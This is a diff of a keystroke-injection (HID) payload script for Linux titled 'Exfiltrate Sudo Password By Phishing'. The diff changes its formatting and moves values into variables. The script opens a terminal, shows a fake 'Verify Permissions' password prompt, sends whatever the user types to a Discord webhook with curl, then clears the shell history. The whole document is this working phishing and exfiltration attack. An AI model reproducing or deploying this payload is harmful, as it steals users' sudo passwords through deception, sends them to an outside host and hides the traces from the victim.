@@ -1,30 +1,32 @@
-* #######################################################
-* #                                                     |
-* # Title        : Exfiltrate Sudo Password By Phishing |
-* # Author       : Aleff                                |
-* # Version      : 1.0                                  |
-* # Category     : Phishing                             |
-* # Target       : Linux                                |
-* #                                                     |
-* #######################################################
+#######################################################
+#                                                     #
+# Title        : Exfiltrate Sudo Password By Phishing #
+# Author       : Aleff                                #
+# Version      : 1.0                                  #
+# Category     : Phishing                             #
+# Target       : Linux                                #
+#                                                     #
+#######################################################
 
-* Requirements:
-*     - Internet Connection
-*     - Discord webhook
+ATTACKMODE HID
+
+# REQUIREMENTS:
+#  - Internet Connection
+#  - Discord webhook
+
+# VARIABLES:
+# - Provide Discord Webhook
+WEBHOOK='https://discordapp.com/api/webhooks/<webhook_id>/<token>'
+
+# CONST (Don't edit):
+TITLE='Verify Permissions'
+CONTENT='Put your sudo password di continue'
+PSWD='password'
 
 QUACK DELAY 1000
 QUACK CTRL-ALT t
 QUACK DELAY 2000
 
-
-* #### POPUP SECTION ####
-
-
-* REQUIRED - Provide Discord Webhook - https://discordapp.com/api/webhooks/<webhook_id>/<token>
-QUACK STRING WEBHOOK_URL="WEBHOOK"
-QUACK ENTER
-QUACK DELAY 500
-
-* All-in-one is important 
-QUACK STRING $(curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"$(kdialog --title "Verify Permissions" --password "Put your sudo password di continue" --default "password")\"}" $WEBHOOK_URL); history -c; exit;
+# All-in-one is important
+QUACK STRING $(curl -H \"Content-Type: application/json\" -X POST -d \"{'content': '$(kdialog --title $TITLE --password $CONTENT --default $PSWD)'}\" $WEBHOOK); history -c; exit;
 QUACK ENTER
